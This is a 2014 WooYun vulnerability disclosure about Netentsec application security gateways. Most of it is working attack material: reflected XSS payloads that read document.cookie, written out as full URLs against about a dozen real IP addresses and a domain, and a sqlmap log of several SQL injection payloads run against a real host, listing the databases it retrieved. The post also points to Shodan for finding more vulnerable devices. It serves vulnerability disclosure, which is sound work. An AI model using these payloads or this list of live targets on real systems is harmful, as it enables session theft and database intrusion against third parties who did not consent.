wybug_title: 网康科技应用安全网关跨站脚本漏洞及SQL注射一枚
wybug_detail:
漏洞详情 披露状态：   									2014-07-20：	细节已通知厂商并且等待厂商处理中									2014-07-24：	厂商已经确认，细节仅向厂商公开									2014-07-27：	细节向第三方安全合作伙伴开放									2014-09-17：	细节向核心白帽子及相关领域专家公开									2014-09-27：	细节向普通白帽子公开									2014-10-07：	细节向实习白帽子公开									2014-10-18：	细节向公众公开  简要描述： 网康科技应用安全网关，通用型跨站脚本漏洞小集合！！不要说这不是你们的设备，更不要自己偷偷修复，哈哈！！相信你们是有节操的网络设备厂商！！哈哈！！ 详细说明：  注入与http://wooyun.org/bugs/wooyun-2014-058913 重复 1 通用型XSS漏洞一，https://IP/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>

通用型证明：https://115.24.177.57/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://211.68.223.12/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://1.202.234.22/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://58.30.139.200/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://221.213.45.231/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://219.129.33.114:10009/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://202.113.20.208/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://whqxj.com/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>https://122.226.150.69/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>通用型XSS漏洞二，https://IP/WebPages/login.php?errstr=xss"></script><script>alert(document.cookie)</script>

通用型证明：https://115.24.177.57/3g/menu.php?uid=xss"></script><script>alert(document.cookie)</script>https://211.68.223.12/3g/menu.php?uid=xss"></script><script>alert(document.cookie)</script>https://58.30.139.200/3g/menu.php?uid=xss"></script><script>alert(document.cookie)</script>https://219.129.33.114:10009/3g/menu.php?uid=xss"></script><script>alert(document.cookie)</script>通过谷歌或shodan可以搜索大量设备，均受影响，这里就不一一举例。   漏洞证明：  



https://211.68.223.12/3g/menu.php?uid=1     注入参数uid
Place: GETParameter: uid    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: uid=-4918 OR (3862=3862)#    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: uid=1 AND (SELECT 7135 FROM(SELECT COUNT(*),CONCAT(0x716f626471,(SELECT (CASE WHEN (7135=7135) THEN 1 ELSE 0 END)),0x71657a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 2 columns    Payload: uid=1 UNION ALL SELECT CONCAT(0x716f626471,0x745a4a434c5279505346,0x71657a7671),NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: uid=1 AND 9630=BENCHMARK(5000000,MD5(0x746a7463))---[12:30:29] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.17, PHP 5.3.4back-end DBMS: MySQL 5.0[12:30:29] [INFO] fetching database names[12:30:31] [INFO] the SQL query used returns 6 entries[12:30:33] [INFO] retrieved: "information_schema"[12:30:34] [INFO] retrieved: "iscserver"[12:30:36] [INFO] retrieved: "iscserver_bak"[12:30:38] [INFO] retrieved: "mysql"[12:30:39] [INFO] retrieved: "performance_schema"[12:30:41] [INFO] retrieved: "test"available databases [6]:                                                                                               [*] information_schema[*] iscserver[*] iscserver_bak[*] mysql[*] performance_schema[*] test
   修复方案：  你们更懂   版权声明：转载请注明来源 大大灰狼@乌云
